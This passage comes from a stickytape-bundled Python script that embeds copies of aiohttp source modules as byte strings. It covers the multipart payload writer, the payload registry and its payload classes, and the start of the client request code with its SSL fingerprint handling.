body part to multipart writer."""\r\n        # compression\r\n        encoding = payload.headers.get(\r\n            CONTENT_ENCODING,\r\n            "",\r\n        ).lower()  # type: Optional[str]\r\n        if encoding and encoding not in ("deflate", "gzip", "identity"):\r\n            raise RuntimeError(f"unknown content encoding: {encoding}")\r\n        if encoding == "identity":\r\n            encoding = None\r\n\r\n        # te encoding\r\n        te_encoding = payload.headers.get(\r\n            CONTENT_TRANSFER_ENCODING,\r\n            "",\r\n        ).lower()  # type: Optional[str]\r\n        if te_encoding not in ("", "base64", "quoted-printable", "binary"):\r\n            raise RuntimeError(\r\n                "unknown content transfer encoding: {}" "".format(te_encoding)\r\n            )\r\n        if te_encoding == "binary":\r\n            te_encoding = None\r\n\r\n        # size\r\n        size = payload.size\r\n        if size is not None and not (encoding or te_encoding):\r\n            payload.headers[CONTENT_LENGTH] = str(size)\r\n\r\n        self._parts.append((payload, encoding, te_encoding))  # type: ignore[arg-type]\r\n        return payload\r\n\r\n    def append_json(\r\n        self, obj: Any, headers: Optional[MultiMapping[str]] = None\r\n    ) -> Payload:\r\n        """Helper to append JSON part."""\r\n        if headers is None:\r\n            headers = CIMultiDict()\r\n\r\n        return self.append_payload(JsonPayload(obj, headers=headers))\r\n\r\n    def append_form(\r\n        self,\r\n        obj: Union[Sequence[Tuple[str, str]], Mapping[str, str]],\r\n        headers: Optional[MultiMapping[str]] = None,\r\n    ) -> Payload:\r\n        """Helper to append form urlencoded part."""\r\n        assert isinstance(obj, (Sequence, Mapping))\r\n\r\n        if headers is None:\r\n            headers = CIMultiDict()\r\n\r\n        if isinstance(obj, Mapping):\r\n            obj = list(obj.items())\r\n        data = urlencode(obj, doseq=True)\r\n\r\n        return self.append_payload(\r\n            StringPayload(\r\n                data, headers=headers, content_type="application/x-www-form-urlencoded"\r\n            )\r\n        )\r\n\r\n    @property\r\n    def size(self) -> Optional[int]:\r\n        """Size of the payload."""\r\n        total = 0\r\n        for part, encoding, te_encoding in self._parts:\r\n            if encoding or te_encoding or part.size is None:\r\n                return None\r\n\r\n            total += int(\r\n                2\r\n                + len(self._boundary)\r\n                + 2\r\n                + part.size  # b\'--\'+self._boundary+b\'\\r\\n\'\r\n                + len(part._binary_headers)\r\n                + 2  # b\'\\r\\n\'\r\n            )\r\n\r\n        total += 2 + len(self._boundary) + 4  # b\'--\'+self._boundary+b\'--\\r\\n\'\r\n        return total\r\n\r\n    async def write(self, writer: Any, close_boundary: bool = True) -> None:\r\n        """Write body."""\r\n        for part, encoding, te_encoding in self._parts:\r\n            await writer.write(b"--" + self._boundary + b"\\r\\n")\r\n            await writer.write(part._binary_headers)\r\n\r\n            if encoding or te_encoding:\r\n                w = MultipartPayloadWriter(writer)\r\n                if encoding:\r\n                    w.enable_compression(encoding)\r\n                if te_encoding:\r\n                    w.enable_encoding(te_encoding)\r\n                await part.write(w)  # type: ignore[arg-type]\r\n                await w.write_eof()\r\n            else:\r\n                await part.write(writer)\r\n\r\n            await writer.write(b"\\r\\n")\r\n\r\n        if close_boundary:\r\n            await writer.write(b"--" + self._boundary + b"--\\r\\n")\r\n\r\n\r\nclass MultipartPayloadWriter:\r\n    def __init__(self, writer: Any) -> None:\r\n        self._writer = writer\r\n        self._encoding = None  # type: Optional[str]\r\n        self._compress = None  # type: Any\r\n        self._encoding_buffer = None  # type: Optional[bytearray]\r\n\r\n    def enable_encoding(self, encoding: str) -> None:\r\n        if encoding == "base64":\r\n            self._encoding = encoding\r\n            self._encoding_buffer = bytearray()\r\n        elif encoding == "quoted-printable":\r\n            self._encoding = "quoted-printable"\r\n\r\n    def enable_compression(\r\n        self, encoding: str = "deflate", strategy: int = zlib.Z_DEFAULT_STRATEGY\r\n    ) -> None:\r\n        zlib_mode = 16 + zlib.MAX_WBITS if encoding == "gzip" else -zlib.MAX_WBITS\r\n        self._compress = zlib.compressobj(wbits=zlib_mode, strategy=strategy)\r\n\r\n    async def write_eof(self) -> None:\r\n        if self._compress is not None:\r\n            chunk = self._compress.flush()\r\n            if chunk:\r\n                self._compress = None\r\n                await self.write(chunk)\r\n\r\n        if self._encoding == "base64":\r\n            if self._encoding_buffer:\r\n                await self._writer.write(base64.b64encode(self._encoding_buffer))\r\n\r\n    async def write(self, chunk: bytes) -> None:\r\n        if self._compress is not None:\r\n            if chunk:\r\n                chunk = self._compress.compress(chunk)\r\n                if not chunk:\r\n                    return\r\n\r\n        if self._encoding == "base64":\r\n            buf = self._encoding_buffer\r\n            assert buf is not None\r\n            buf.extend(chunk)\r\n\r\n            if buf:\r\n                div, mod = divmod(len(buf), 3)\r\n                enc_chunk, self._encoding_buffer = (buf[: div * 3], buf[div * 3 :])\r\n                if enc_chunk:\r\n                    b64chunk = base64.b64encode(enc_chunk)\r\n                    await self._writer.write(b64chunk)\r\n        elif self._encoding == "quoted-printable":\r\n            await self._writer.write(binascii.b2a_qp(chunk))\r\n        else:\r\n            await self._writer.write(chunk)\r\n')
    __stickytape_write_module('aiohttp/payload.py', b'import asyncio\r\nimport enum\r\nimport io\r\nimport json\r\nimport mimetypes\r\nimport os\r\nimport warnings\r\nfrom abc import ABC, abstractmethod\r\nfrom itertools import chain\r\nfrom typing import (\r\n    IO,\r\n    TYPE_CHECKING,\r\n    Any,\r\n    ByteString,\r\n    Dict,\r\n    Iterable,\r\n    Optional,\r\n    TextIO,\r\n    Tuple,\r\n    Type,\r\n    Union,\r\n)\r\n\r\nfrom multidict import CIMultiDict\r\n\r\nfrom . import hdrs\r\nfrom .abc import AbstractStreamWriter\r\nfrom .helpers import (\r\n    PY_36,\r\n    content_disposition_header,\r\n    guess_filename,\r\n    parse_mimetype,\r\n    sentinel,\r\n)\r\nfrom .streams import StreamReader\r\nfrom .typedefs import Final, JSONEncoder, _CIMultiDict\r\n\r\n__all__ = (\r\n    "PAYLOAD_REGISTRY",\r\n    "get_payload",\r\n    "payload_type",\r\n    "Payload",\r\n    "BytesPayload",\r\n    "StringPayload",\r\n    "IOBasePayload",\r\n    "BytesIOPayload",\r\n    "BufferedReaderPayload",\r\n    "TextIOPayload",\r\n    "StringIOPayload",\r\n    "JsonPayload",\r\n    "AsyncIterablePayload",\r\n)\r\n\r\nTOO_LARGE_BYTES_BODY: Final[int] = 2 ** 20  # 1 MB\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from typing import List\r\n\r\n\r\nclass LookupError(Exception):\r\n    pass\r\n\r\n\r\nclass Order(str, enum.Enum):\r\n    normal = "normal"\r\n    try_first = "try_first"\r\n    try_last = "try_last"\r\n\r\n\r\ndef get_payload(data: Any, *args: Any, **kwargs: Any) -> "Payload":\r\n    return PAYLOAD_REGISTRY.get(data, *args, **kwargs)\r\n\r\n\r\ndef register_payload(\r\n    factory: Type["Payload"], type: Any, *, order: Order = Order.normal\r\n) -> None:\r\n    PAYLOAD_REGISTRY.register(factory, type, order=order)\r\n\r\n\r\nclass payload_type:\r\n    def __init__(self, type: Any, *, order: Order = Order.normal) -> None:\r\n        self.type = type\r\n        self.order = order\r\n\r\n    def __call__(self, factory: Type["Payload"]) -> Type["Payload"]:\r\n        register_payload(factory, self.type, order=self.order)\r\n        return factory\r\n\r\n\r\nPayloadType = Type["Payload"]\r\n_PayloadRegistryItem = Tuple[PayloadType, Any]\r\n\r\n\r\nclass PayloadRegistry:\r\n    """Payload registry.\r\n\r\n    note: we need zope.interface for more efficient adapter search\r\n    """\r\n\r\n    def __init__(self) -> None:\r\n        self._first = []  # type: List[_PayloadRegistryItem]\r\n        self._normal = []  # type: List[_PayloadRegistryItem]\r\n        self._last = []  # type: List[_PayloadRegistryItem]\r\n\r\n    def get(\r\n        self,\r\n        data: Any,\r\n        *args: Any,\r\n        _CHAIN: "Type[chain[_PayloadRegistryItem]]" = chain,\r\n        **kwargs: Any,\r\n    ) -> "Payload":\r\n        if isinstance(data, Payload):\r\n            return data\r\n        for factory, type in _CHAIN(self._first, self._normal, self._last):\r\n            if isinstance(data, type):\r\n                return factory(data, *args, **kwargs)\r\n\r\n        raise LookupError()\r\n\r\n    def register(\r\n        self, factory: PayloadType, type: Any, *, order: Order = Order.normal\r\n    ) -> None:\r\n        if order is Order.try_first:\r\n            self._first.append((factory, type))\r\n        elif order is Order.normal:\r\n            self._normal.append((factory, type))\r\n        elif order is Order.try_last:\r\n            self._last.append((factory, type))\r\n        else:\r\n            raise ValueError(f"Unsupported order {order!r}")\r\n\r\n\r\nclass Payload(ABC):\r\n\r\n    _default_content_type = "application/octet-stream"  # type: str\r\n    _size = None  # type: Optional[int]\r\n\r\n    def __init__(\r\n        self,\r\n        value: Any,\r\n        headers: Optional[\r\n            Union[_CIMultiDict, Dict[str, str], Iterable[Tuple[str, str]]]\r\n        ] = None,\r\n        content_type: Optional[str] = sentinel,\r\n        filename: Optional[str] = None,\r\n        encoding: Optional[str] = None,\r\n        **kwargs: Any,\r\n    ) -> None:\r\n        self._encoding = encoding\r\n        self._filename = filename\r\n        self._headers = CIMultiDict()  # type: _CIMultiDict\r\n        self._value = value\r\n        if content_type is not sentinel and content_type is not None:\r\n            self._headers[hdrs.CONTENT_TYPE] = content_type\r\n        elif self._filename is not None:\r\n            content_type = mimetypes.guess_type(self._filename)[0]\r\n            if content_type is None:\r\n                content_type = self._default_content_type\r\n            self._headers[hdrs.CONTENT_TYPE] = content_type\r\n        else:\r\n            self._headers[hdrs.CONTENT_TYPE] = self._default_content_type\r\n        self._headers.update(headers or {})\r\n\r\n    @property\r\n    def size(self) -> Optional[int]:\r\n        """Size of the payload."""\r\n        return self._size\r\n\r\n    @property\r\n    def filename(self) -> Optional[str]:\r\n        """Filename of the payload."""\r\n        return self._filename\r\n\r\n    @property\r\n    def headers(self) -> _CIMultiDict:\r\n        """Custom item headers"""\r\n        return self._headers\r\n\r\n    @property\r\n    def _binary_headers(self) -> bytes:\r\n        return (\r\n            "".join([k + ": " + v + "\\r\\n" for k, v in self.headers.items()]).encode(\r\n                "utf-8"\r\n            )\r\n            + b"\\r\\n"\r\n        )\r\n\r\n    @property\r\n    def encoding(self) -> Optional[str]:\r\n        """Payload encoding"""\r\n        return self._encoding\r\n\r\n    @property\r\n    def content_type(self) -> str:\r\n        """Content type"""\r\n        return self._headers[hdrs.CONTENT_TYPE]\r\n\r\n    def set_content_disposition(\r\n        self,\r\n        disptype: str,\r\n        quote_fields: bool = True,\r\n        _charset: str = "utf-8",\r\n        **params: Any,\r\n    ) -> None:\r\n        """Sets ``Content-Disposition`` header."""\r\n        self._headers[hdrs.CONTENT_DISPOSITION] = content_disposition_header(\r\n            disptype, quote_fields=quote_fields, _charset=_charset, **params\r\n        )\r\n\r\n    @abstractmethod\r\n    async def write(self, writer: AbstractStreamWriter) -> None:\r\n        """Write payload.\r\n\r\n        writer is an AbstractStreamWriter instance:\r\n        """\r\n\r\n\r\nclass BytesPayload(Payload):\r\n    def __init__(self, value: ByteString, *args: Any, **kwargs: Any) -> None:\r\n        if not isinstance(value, (bytes, bytearray, memoryview)):\r\n            raise TypeError(f"value argument must be byte-ish, not {type(value)!r}")\r\n\r\n        if "content_type" not in kwargs:\r\n            kwargs["content_type"] = "application/octet-stream"\r\n\r\n        super().__init__(value, *args, **kwargs)\r\n\r\n        if isinstance(value, memoryview):\r\n            self._size = value.nbytes\r\n        else:\r\n            self._size = len(value)\r\n\r\n        if self._size > TOO_LARGE_BYTES_BODY:\r\n            if PY_36:\r\n                kwargs = {"source": self}\r\n            else:\r\n                kwargs = {}\r\n            warnings.warn(\r\n                "Sending a large body directly with raw bytes might"\r\n                " lock the event loop. You should probably pass an "\r\n                "io.BytesIO object instead",\r\n                ResourceWarning,\r\n                **kwargs,\r\n            )\r\n\r\n    async def write(self, writer: AbstractStreamWriter) -> None:\r\n        await writer.write(self._value)\r\n\r\n\r\nclass StringPayload(BytesPayload):\r\n    def __init__(\r\n        self,\r\n        value: str,\r\n        *args: Any,\r\n        encoding: Optional[str] = None,\r\n        content_type: Optional[str] = None,\r\n        **kwargs: Any,\r\n    ) -> None:\r\n\r\n        if encoding is None:\r\n            if content_type is None:\r\n                real_encoding = "utf-8"\r\n                content_type = "text/plain; charset=utf-8"\r\n            else:\r\n                mimetype = parse_mimetype(content_type)\r\n                real_encoding = mimetype.parameters.get("charset", "utf-8")\r\n        else:\r\n            if content_type is None:\r\n                content_type = "text/plain; charset=%s" % encoding\r\n            real_encoding = encoding\r\n\r\n        super().__init__(\r\n            value.encode(real_encoding),\r\n            encoding=real_encoding,\r\n            content_type=content_type,\r\n            *args,\r\n            **kwargs,\r\n        )\r\n\r\n\r\nclass StringIOPayload(StringPayload):\r\n    def __init__(self, value: IO[str], *args: Any, **kwargs: Any) -> None:\r\n        super().__init__(value.read(), *args, **kwargs)\r\n\r\n\r\nclass IOBasePayload(Payload):\r\n    _value: IO[Any]\r\n\r\n    def __init__(\r\n        self, value: IO[Any], disposition: str = "attachment", *args: Any, **kwargs: Any\r\n    ) -> None:\r\n        if "filename" not in kwargs:\r\n            kwargs["filename"] = guess_filename(value)\r\n\r\n        super().__init__(value, *args, **kwargs)\r\n\r\n        if self._filename is not None and disposition is not None:\r\n            if hdrs.CONTENT_DISPOSITION not in self.headers:\r\n                self.set_content_disposition(disposition, filename=self._filename)\r\n\r\n    async def write(self, writer: AbstractStreamWriter) -> None:\r\n        loop = asyncio.get_event_loop()\r\n        try:\r\n            chunk = await loop.run_in_executor(None, self._value.read, 2 ** 16)\r\n            while chunk:\r\n                await writer.write(chunk)\r\n                chunk = await loop.run_in_executor(None, self._value.read, 2 ** 16)\r\n        finally:\r\n            await loop.run_in_executor(None, self._value.close)\r\n\r\n\r\nclass TextIOPayload(IOBasePayload):\r\n    _value: TextIO\r\n\r\n    def __init__(\r\n        self,\r\n        value: TextIO,\r\n        *args: Any,\r\n        encoding: Optional[str] = None,\r\n        content_type: Optional[str] = None,\r\n        **kwargs: Any,\r\n    ) -> None:\r\n\r\n        if encoding is None:\r\n            if content_type is None:\r\n                encoding = "utf-8"\r\n                content_type = "text/plain; charset=utf-8"\r\n            else:\r\n                mimetype = parse_mimetype(content_type)\r\n                encoding = mimetype.parameters.get("charset", "utf-8")\r\n        else:\r\n            if content_type is None:\r\n                content_type = "text/plain; charset=%s" % encoding\r\n\r\n        super().__init__(\r\n            value,\r\n            content_type=content_type,\r\n            encoding=encoding,\r\n            *args,\r\n            **kwargs,\r\n        )\r\n\r\n    @property\r\n    def size(self) -> Optional[int]:\r\n        try:\r\n            return os.fstat(self._value.fileno()).st_size - self._value.tell()\r\n        except OSError:\r\n            return None\r\n\r\n    async def write(self, writer: AbstractStreamWriter) -> None:\r\n        loop = asyncio.get_event_loop()\r\n        try:\r\n            chunk = await loop.run_in_executor(None, self._value.read, 2 ** 16)\r\n            while chunk:\r\n                data = (\r\n                    chunk.encode(encoding=self._encoding)\r\n                    if self._encoding\r\n                    else chunk.encode()\r\n                )\r\n                await writer.write(data)\r\n                chunk = await loop.run_in_executor(None, self._value.read, 2 ** 16)\r\n        finally:\r\n            await loop.run_in_executor(None, self._value.close)\r\n\r\n\r\nclass BytesIOPayload(IOBasePayload):\r\n    @property\r\n    def size(self) -> int:\r\n        position = self._value.tell()\r\n        end = self._value.seek(0, os.SEEK_END)\r\n        self._value.seek(position)\r\n        return end - position\r\n\r\n\r\nclass BufferedReaderPayload(IOBasePayload):\r\n    @property\r\n    def size(self) -> Optional[int]:\r\n        try:\r\n            return os.fstat(self._value.fileno()).st_size - self._value.tell()\r\n        except OSError:\r\n            # data.fileno() is not supported, e.g.\r\n            # io.BufferedReader(io.BytesIO(b\'data\'))\r\n            return None\r\n\r\n\r\nclass JsonPayload(BytesPayload):\r\n    def __init__(\r\n        self,\r\n        value: Any,\r\n        encoding: str = "utf-8",\r\n        content_type: str = "application/json",\r\n        dumps: JSONEncoder = json.dumps,\r\n        *args: Any,\r\n        **kwargs: Any,\r\n    ) -> None:\r\n\r\n        super().__init__(\r\n            dumps(value).encode(encoding),\r\n            content_type=content_type,\r\n            encoding=encoding,\r\n            *args,\r\n            **kwargs,\r\n        )\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from typing import AsyncIterable, AsyncIterator\r\n\r\n    _AsyncIterator = AsyncIterator[bytes]\r\n    _AsyncIterable = AsyncIterable[bytes]\r\nelse:\r\n    from collections.abc import AsyncIterable, AsyncIterator\r\n\r\n    _AsyncIterator = AsyncIterator\r\n    _AsyncIterable = AsyncIterable\r\n\r\n\r\nclass AsyncIterablePayload(Payload):\r\n\r\n    _iter = None  # type: Optional[_AsyncIterator]\r\n\r\n    def __init__(self, value: _AsyncIterable, *args: Any, **kwargs: Any) -> None:\r\n        if not isinstance(value, AsyncIterable):\r\n            raise TypeError(\r\n                "value argument must support "\r\n                "collections.abc.AsyncIterablebe interface, "\r\n                "got {!r}".format(type(value))\r\n            )\r\n\r\n        if "content_type" not in kwargs:\r\n            kwargs["content_type"] = "application/octet-stream"\r\n\r\n        super().__init__(value, *args, **kwargs)\r\n\r\n        self._iter = value.__aiter__()\r\n\r\n    async def write(self, writer: AbstractStreamWriter) -> None:\r\n        if self._iter:\r\n            try:\r\n                # iter is not None check prevents rare cases\r\n                # when the case iterable is used twice\r\n                while True:\r\n                    chunk = await self._iter.__anext__()\r\n                    await writer.write(chunk)\r\n            except StopAsyncIteration:\r\n                self._iter = None\r\n\r\n\r\nclass StreamReaderPayload(AsyncIterablePayload):\r\n    def __init__(self, value: StreamReader, *args: Any, **kwargs: Any) -> None:\r\n        super().__init__(value.iter_any(), *args, **kwargs)\r\n\r\n\r\nPAYLOAD_REGISTRY = PayloadRegistry()\r\nPAYLOAD_REGISTRY.register(BytesPayload, (bytes, bytearray, memoryview))\r\nPAYLOAD_REGISTRY.register(StringPayload, str)\r\nPAYLOAD_REGISTRY.register(StringIOPayload, io.StringIO)\r\nPAYLOAD_REGISTRY.register(TextIOPayload, io.TextIOBase)\r\nPAYLOAD_REGISTRY.register(BytesIOPayload, io.BytesIO)\r\nPAYLOAD_REGISTRY.register(BufferedReaderPayload, (io.BufferedReader, io.BufferedRandom))\r\nPAYLOAD_REGISTRY.register(IOBasePayload, io.IOBase)\r\nPAYLOAD_REGISTRY.register(StreamReaderPayload, StreamReader)\r\n# try_last for giving a chance to more specialized async interables like\r\n# multidict.BodyPartReaderPayload override the default\r\nPAYLOAD_REGISTRY.register(AsyncIterablePayload, AsyncIterable, order=Order.try_last)\r\n')
    __stickytape_write_module('aiohttp/client_reqrep.py', b'import asyncio\r\nimport codecs\r\nimport functools\r\nimport io\r\nimport re\r\nimport sys\r\nimport traceback\r\nimport warnings\r\nfrom hashlib import md5, sha1, sha256\r\nfrom http.cookies import CookieError, Morsel, SimpleCookie\r\nfrom types import MappingProxyType, TracebackType\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Dict,\r\n    Iterable,\r\n    List,\r\n    Mapping,\r\n    Optional,\r\n    Tuple,\r\n    Type,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nimport attr\r\nfrom multidict import CIMultiDict, CIMultiDictProxy, MultiDict, MultiDictProxy\r\nfrom yarl import URL\r\n\r\nfrom . import hdrs, helpers, http, multipart, payload\r\nfrom .abc import AbstractStreamWriter\r\nfrom .client_exceptions import (\r\n    ClientConnectionError,\r\n    ClientOSError,\r\n    ClientResponseError,\r\n    ContentTypeError,\r\n    InvalidURL,\r\n    ServerFingerprintMismatch,\r\n)\r\nfrom .formdata import FormData\r\nfrom .helpers import (\r\n    PY_36,\r\n    BaseTimerContext,\r\n    BasicAuth,\r\n    HeadersMixin,\r\n    TimerNoop,\r\n    noop,\r\n    reify,\r\n    set_result,\r\n)\r\nfrom .http import SERVER_SOFTWARE, HttpVersion10, HttpVersion11, StreamWriter\r\nfrom .log import client_logger\r\nfrom .streams import StreamReader\r\nfrom .typedefs import (\r\n    DEFAULT_JSON_DECODER,\r\n    JSONDecoder,\r\n    LooseCookies,\r\n    LooseHeaders,\r\n    RawHeaders,\r\n)\r\n\r\ntry:\r\n    import ssl\r\n    from ssl import SSLContext\r\nexcept ImportError:  # pragma: no cover\r\n    ssl = None  # type: ignore[assignment]\r\n    SSLContext = object  # type: ignore[misc,assignment]\r\n\r\ntry:\r\n    import cchardet as chardet\r\nexcept ImportError:  # pragma: no cover\r\n    import charset_normalizer as chardet  # type: ignore[no-redef]\r\n\r\n\r\n__all__ = ("ClientRequest", "ClientResponse", "RequestInfo", "Fingerprint")\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .client import ClientSession\r\n    from .connector import Connection\r\n    from .tracing import Trace\r\n\r\n\r\njson_re = re.compile(r"^application/(?:[\\w.+-]+?\\+)?json")\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass ContentDisposition:\r\n    type: Optional[str]\r\n    parameters: "MappingProxyType[str, str]"\r\n    filename: Optional[str]\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass RequestInfo:\r\n    url: URL\r\n    method: str\r\n    headers: "CIMultiDictProxy[str]"\r\n    real_url: URL = attr.ib()\r\n\r\n    @real_url.default\r\n    def real_url_default(self) -> URL:\r\n        return self.url\r\n\r\n\r\nclass Fingerprint:\r\n    HASHFUNC_BY_DIGESTLEN = {\r\n        16: md5,\r\n        20: sha1,\r\n        32: sha256,\r\n    }\r\n\r\n    def __init__(self, fingerprint: bytes) -> None:\r\n        digestlen = len(fingerprint)\r\n        hashfunc = self.HASHFUNC_BY_DIGESTLEN.get(digestlen)\r\n        if not hashfunc:\r\n            raise ValueError("fingerprint has invalid length")\r\n        elif hashfunc is md5 or hashfunc is sha1:\r\n            raise ValueError(\r\n                "md5 and sha1 are insecure and " "not supported. Use sha256."\r\n            )\r\n        self._hashfunc = hashfunc\r\n        self._fingerprint = fingerprint\r\n\r\n    @property\r\n    def fingerprint(self) -> bytes:\r\n        return self._fingerprint\r\n\r\n    def check(self, transport: asyncio.Transport) -> None:\r\n        if not transport.get_extra_info("sslcontext"):\r\n            return\r\n        sslobj = transport.get_extra_info("ssl_object")\r\n        cert = sslobj.getpeercert(binary_form=True)\r\n        got = self._hashfunc(cert).digest()\r\n        if got != self._fingerprint:\r\n            host, port, *_ = transport.get_extra_info("peername")\r\n            raise ServerFingerprintMismatch(self._fingerprint, got, host, port)\r\n\r\n\r\nif ssl is not None:\r\n    SSL_ALLOWED_TYPES = (ssl.SSLContext, bool, Fingerprint, type(None))\r\nelse:  # pragma: no cover\r\n    SSL_ALLOWED_TYPES = type(None)\r\n\r\n\r\ndef _merge_ssl_params(\r\n    ssl: Union["SSLContext", bool, Fingerprint, None],\r\n    verify_ssl: Optional[bool],\r\n    ssl_context: Optional["SSLContext"],\r\n    fingerprint: Optional[bytes],\r\n) -> Union["SSLContext", bool, Fingerprint, None]:\r\n    if verify_ssl is not None and not verify_ssl:\r\n        warnings.warn(\r\n            "verify_ssl is deprecated, use ssl=False instead",\r\n            DeprecationWarning,\r\n            stacklevel=3,\r\n        )\r\n        if ssl is not None:\r\n            raise ValueError(\r\n                "verify_ssl, ssl_context, fingerprint and ssl "\r\n                "parameters are mutually exclusive"\r\n            )\r\n        else:\r\n            ssl = False\r\n    if ssl_context is not None:\r\n        warnings.warn(\r\n            "ssl_context is deprecated, use ssl=context instead",\r\n            DeprecationWarning,\r\n            stacklevel=3,\r\n        )\r\n        if ssl is not None:\r\n            raise ValueError(\r\n                "verify_ssl, ssl_context, fingerprint and ssl "\r\n                "parameters are mutually exclusive"\r\n            )\r\n        else:\r\n            ssl = ssl_context\r\n    if fingerprint is not None:\r\n        warnings.warn(\r\n            "fingerprint is deprecated, " "use ssl=Fingerprint(fingerprint) instead",\r\n            DeprecationWarning,\r\n            stacklevel=3,\r\n        )\r\n        if ssl is not None:\r\n            raise ValueError(\r\n                "verify_ssl, ssl_context, fingerprint and ssl "\r\n                "parameters are mutually exclusive"\r\n            )\r\n        else:\r\n            ssl = Fingerprint(fingerprint)\r\n    if not isinstance(ssl, SSL_ALLOWED_TYPES):\r\n        raise TypeError(\r\n            "ssl should be SSLContext, bool, Fingerprint or None, "\r\n            "got {!r} instead.".format(ssl)\r\n        )\r\n    return ssl\r\n\r\n\r\n@attr.s(auto_attribs=True, slots=True, frozen=True)\r\nclass ConnectionKey:\r\n    # the key should contain an information about used proxy / TLS\r\n    # to prevent reusing wrong connections from a pool\r\n    host: str\r\n    port: Optional[int]\r\n    is_ssl: bool\r\n    ssl: Union[SSLContext, None, bool, Fingerprint]\r\n    proxy: Optional[URL]\r\n    proxy_auth: Optional[BasicAuth]\r\n    proxy_headers_hash: Optional[int]  # hash(CIMultiDict)\r\n\r\n\r\ndef _is_expected_content_type(\r\n    response_content_type: str, expected_content_type: str\r\n) -> bool:\r\n    if expected_content_type == "application/json":\r\n        return json_re.match(response_content_type) is not None\r\n    return expected_content_type in response_content_type\r\n\r\n\r\nclass ClientRequest:\r\n    GET_METHODS = {\r\n        hdrs.METH_GET,\r\n        hdrs.METH_HEAD,\r\n        hdrs.METH_OPTIONS,\r\n        hdrs.METH_TRACE,\r\n    }\r\n    POST_METHODS = {hdrs.METH_PATCH, hdrs.METH_POST, hdrs.METH_PUT}\r\n    ALL_METHODS = GET_METHODS.union(POST_METHODS).union({hdrs.METH_DELETE})\r\n\r\n    DEFAULT_HEADERS = {\r\n        hdrs.ACCEPT: "*/*",\r\n        hdrs.ACCEPT_ENCODING: "gzip, deflate",\r\n    }\r\n\r\n    body = b""\r\n    auth = None\r\n    response = None\r\n\r\n    _writer = None  # async task for streaming data\r\n    _continue = None  # waiter future for \'100 Continue\' response\r\n\r\n    # N.B.\r\n    # Adding __del__ method with self._writer closing doesn\'t make sense\r\n    # because _writer is instance method, thus it keeps a reference to self.\r\n    # Until writer has finished finalizer will not be called.\r\n\r\n    def __init__(\r\n        self,\r\n        method: str,\r\n        url: URL,\r\n        *,\r\n        params: Optional[Mapping[str, str]] = None,\r\n        headers: Optional[LooseHeaders] = None,\r\n        skip_auto_headers: Iterable[str] = frozenset(),\r\n        data: Any = None,\r\n        cookies: Optional[LooseCookies] = None,\r\n        auth: Optional[BasicAuth] = None,\r\n        version: http.HttpVersion = http.HttpVersion11,\r\n        compress: Optional[str] = None,\r\n        chunked: Optional[bool] = None,\r\n        expect100: bool = False,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n        response_class: Optional[Type["ClientResponse"]] = None,\r\n        proxy: Optional[URL] = None,\r\n        proxy_auth: Optional[BasicAuth] = None,\r\n        timer: Optional[BaseTimerContext] = None,\r\n        session: Optional["ClientSession"] = None,\r\n        ssl: Union[SSLContext, bool, Fingerprint, None] = None,\r\n        proxy_headers: Optional[LooseHeaders] = None,\r\n        traces: Optional[List["Trace"]] = None,\r\n    ):\r\n\r\n        if loop is None:\r\n            loop = asyncio.get_event_loop()\r\n\r\n        assert isinstance(url, URL), url\r\n        assert isinstance(proxy, (URL, type(None))), proxy\r\n        # FIXME: session is None in tests only, need to fix tests\r\n        # assert session is not None\r\n        self._session = cast("ClientSession", session)\r\n        if params:\r\n            q = MultiDict(url.query)\r\n            url2 = url.with_query(params)\r\n            q.extend(url2.query)\r\n            url = url.with_query(q)\r\n        self.original_url = url\r\n        self.url = url.with_fragment(None)\r\n        self.method = method.upper()\r\n        self.chunked = chunked\r\n        self.compress = compress\r\n        self.loop = loop\r\n        self.length = None\r\n        if response_class is None:\r\n            real_response_class = ClientResponse\r\n        else:\r\n            real_response_class = response_class\r\n        self.response_class = real_response_class  # type: Type[ClientResponse]\r\n        self._timer = timer if timer is not None else TimerNoop()\r\n        self._ssl = ssl\r\n\r\n        if loop.get_debug():\r\n            self._source_traceback = traceback.extract_stack(sys._getframe(1))\r\n\r\n        self.update_version(version)\r\n        self.update_host(url)\r\n        self.update_headers(headers)\r\n        self.update_auto_headers(skip_auto_headers)\r\n        self.update_cookies(cookies)\r\n        self.update_content_encoding(data)\r\n        self.update_auth(auth)\r\n        self.update_proxy(proxy, proxy_auth, proxy_headers)\r\n\r\n        self.update_body_from_data(data)\r\n        if data is not None or self.method not in self.GET_METHODS:\r\n            self.update_transfer_encoding()\r\n        self.update_expect_continue(expect100)\r\n        if traces is None:\r\n            traces = []\r\n        self._traces = traces\r\n\r\n    def is_ssl(self) -> bool:\r\n        return self.url.scheme in ("https", "wss")\r\n\r\n    @property\r\n    def ssl(self) -> Union["SSLContext", None, bool, Fingerprint]:\r\n        return self._ssl\r\n\r\n    @property\r\n    def connection_key(self) -> ConnectionKey:\r\n        proxy_headers = self.proxy_headers\r\n        if proxy_headers:\r\n            h = hash(\r\n                tuple((k, v) for k, v in proxy_headers.items())\r\n            )  # type: Optional[int]\r\n        else:\r\n            h = None\r\n        return ConnectionKey(\r\n            self.host,\r\n            self.port,\r\n            self.is_ssl(),\r\n            self.ssl,\r\n            self.proxy,\r\n            self.proxy_auth,\r\n            h,\r\n        )\r\n\r\n    @property\r\n    def host(self) -> str:\r\n        ret = self.url.raw_host\r\n        assert ret is not None\r\n        return ret\r\n\r\n    @property\r\n    def port(self) -> Optional[int]:\r\n        return self.url.port\r\n\r\n    @property\r\n    def request_info(self) -> RequestInfo:\r\n        headers = CIMultiDictProxy(self.headers)  # type: CIMultiDictProxy[str]\r\n        return RequestInfo(self.url, self.method, headers, self.original_url)\r\n\r\n    def update_host(self, url: URL) -> None:\r\n        """Update destination host, port and connection type (ssl)."""\r\n        # get host/port\r\n        if not url.raw_host:\r\n            raise InvalidURL(url)\r\n\r\n        # basic auth info\r\n        username, password = url.user, url.password\r\n        if username:\r\n            self.auth = helpers.BasicAuth(username, password or "")\r\n\r\n    def update_version(self, version: Union[http.HttpVersion, str]) -> None:\r\n        """Convert request version to two elements tuple.\r\n\r\n        parser HTTP version 